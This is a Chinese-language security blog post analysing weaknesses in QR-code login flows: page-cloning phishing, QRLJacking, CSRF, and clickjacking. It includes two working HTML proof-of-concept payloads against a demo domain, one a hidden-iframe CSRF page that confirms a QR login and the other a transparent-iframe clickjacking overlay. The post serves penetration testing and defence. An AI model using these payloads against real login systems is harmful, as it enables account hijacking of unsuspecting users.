---
layout: post
author: Vulkey_Chen
title: "二维码登陆的常见缺陷剖析"
date: 2018-04-08
categories: 二维码登陆
permalink: /archives/2018-04-08/1
description: "二维码登陆，在表面上来看好像是很安全，但是深入去研究会发现很多都是存在安全隐患～"
---

#  二维码登陆的常见缺陷剖析

现在很多的电商平台和互联网型企业都有自己的手机APP，为了方便用户的体验，于是就有了"扫码登陆"这样的功能。看似扫码登陆，实际上还是基于HTTP请求来完成的。

## 了解扫码登陆步骤

标准的二维码登陆流程如下：
1. 打开web界面进入登陆然后加载二维码
2. 网站开始轮询，来检测二维码状态
3. 打开手机APP进入"扫一扫"，扫描二维码
4. 网站检测到二维码被扫描，进入被扫描后的界面，继续轮询来获取凭证
5. 手机APP进入确认登陆界面
6. (当点击确认登陆)网站轮询结束获取到了凭证，进入个人中心；(当取消登陆)网站轮询设定时间自动刷新页面。

## 常见缺陷剖析

### 0x00 非标准扫码登陆流程缺陷

#### 非标准流程描述

扫描登陆的流程如果不按照标准来做也会存在很多问题，国内一些企业在处理这些的时候省略了如上所述的第五步骤和第六步骤，而是直接扫描后立即登陆。

#### 分析非标准流程可能存在的问题

- 可进行1:1比例诱导扫描

二维码是一张图片而图片是可以移植的，所以我们可以1:1克隆一个登陆页面来诱导用户进行扫描，这样就可以直接获取用户的权限了。

因为保密协议的问题，这里不对漏洞详情进行描述，简单的使用文字进行叙述：

在测试这种问题的时候，只需要按照步骤去测试下即可发现是否有相对于的问题，我一般会使用浏览器ctrl+s快捷键先克隆下来，因为这样会自带css和js等文件，剩下的只需要你处理一下就行了，也可以参考我之前的文章：[微信Netting-QRLJacking分析利用-扫我二维码获取你的账号权限](https://bbs.ichunqiu.com/thread-25923-1-1.html)，方法类似就行，但是这里的微信二维码登录是基于OAuth2.0协议的，所以当用户点击之后，我只要获取到授权凭证链接就行了，而一般的二维码登陆是不基于OAuth2.0协议的，就需要处理好你的交互问题。

### 0x01 QRLJacking-二维码登陆劫持

2017年OWASP推出了这种攻击方式：https://www.owasp.org/index.php/Qrljacking

因为OWASP上有详细的介绍，所以在这里我就不以实际案例来说明了。

补充的一点是在0x00中我已经说明了之前一篇文章[微信Netting-QRLJacking分析利用-扫我二维码获取你的账号权限](https://bbs.ichunqiu.com/thread-25923-1-1.html)，在这里我称之为Netting-QRLJacking是因为我们可以使用钓鱼网站方式的方法进行大面积撒网~而其实这里是利用了OAuth2.0的一个流程特征，我们想进行二维码登录劫持的时候也可以利用"扫码登陆"的流程特征。

之前已经把"扫码登陆"的流程说的很清楚了，我们知道其中一步轮询是用户点击确认登陆之后就通过轮询这个接口可以直接获得凭证，利用这个特点就行了。

**小提示：**整个流程划分为一个一个的接口来测试，你会更清楚的。

### 0x02 CSRF跨站请求访问

之在0x01说了，把整个流程划分为一个个的接口来测试，你就会更清楚，其实潜台词就是**"你会发现更多漏洞"**~

以一个实际例子来讲解：

在测试一个站点的时候遇到的问题，其扫码登陆的流程全部为GET类型请求：

1. 打开web界面进入登陆然后加载二维码**（http://www.gh0stdemo.cn/getqrcode 返回一段uuid 二维码的链接为 http://www.gh0stdemo.cn/qrcode?code=qrcode）**
2. 网站开始轮询，来检测二维码状态**（http://www.gh0stdemo.cn/getqrlstate?code=qrcode）**
3. 打开手机APP进入"扫一扫"，扫描二维码**（http://www.gh0stdemo.cn/qrcode?code=qrcode）**
4. 网站检测到二维码被扫描，进入被扫描后的界面，继续轮询来获取凭证**（http://www.gh0stdemo.cn/getqrlstate?code=qrcode）**
5. 手机APP进入确认登陆界面**（这步骤必须需要经过第四步骤之后才可以 http://www.gh0stdemo.cn/putqrlstate?code=qrcode）**
6. (当点击确认登陆)网站轮询结束获取到了凭证，进入个人中心；(当取消登陆)网站轮询设定时间自动刷新页面。


在这里我们可以构建这样的PoC：

```html
<!DOCTYPE html>
<html>
<head>
	<title>PoC</title>
</head>
<body>
<script>
function loadsrc(){
	document.getElementById("test1").src="http://www.gh0stdemo.cn/qrcode?code=qrcode";
}
setTimeout('loadsrc()',1000);
</script>
<iframe id="test1" src="http://www.gh0stdemo.cn/putqrlstate?code=qrcode">
</iframe>
</body>
</html>
```

很简单的一个PoC就构成了，这里也确实存在CSRF的问题，可能在这里有人会想到攻击面得问题，仅仅只限于APP端？当然不，其实原理是一样得，都是把自己的凭证(Cookie)发出去，所以在电脑的web端只要登陆了一样可以完成攻击步骤~

当然在这里也有POST形式的CSRF，因为内容重复度过高就不一一举例了。

### 0x03 ClickJacking-点击劫持

点击劫持，视觉欺骗

根据扫码登陆的流程中我们可以看到有一个流程强制的要求了用户去点击确认登陆的按钮，但是这个界面往往没有做点击劫持的防范：

在我之前的一篇文章中详细讲了PoC的制作方法：http://gh0st.cn/archives/2017-12-20/1

之前跟一朋友在测试的时候发现了一些问题，有些网站用iframe标签引用进来，不会百分百的自适应，在这里我使用了div为父元素，如何再在div里面写入iframe这个子元素来自适应就行了。

```html
<html>
<head>
<meta name="referrer" content="never">
<style type="text/css"> 
.testframe {
	height: 100%;
} 
iframe {
	height: 100%;
	width: 100%;
	border: 0;
	margin: 0;
	padding: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
    filter: alpha(Opacity=0); /*提供给IE浏览器8之前的*/
    -moz-opacity: 0; /*提供给火狐浏览器的*/
    -webkit-opacity: 0; /*提供给webkit内核的*/
    -khtml-opacity: 0; /*提供给KHTML内核的*/
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)"; /*提供给IE8之后的*/
    opacity: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
}
.btn {
    position: fixed;
    width: 97%;
    height: 42px;
    margin: 0 auto;
    left: 0;
    right:0;
    display:block;
    top: 815px;
} 
</style>
</head>
<body>
<div class="testframe">
	<input type="button" class="btn" value="Click">
	<iframe src="http://www.gh0stdemo.cn/qrcode?code=qrcode"></iframe>
</div>
</body>
</html>
```

示例结果：

![https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-04-08/0x00.png](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-04-08/0x00.png)



## 结尾

本文没详细的去写，仅仅记录笔者的实践过程和心得。
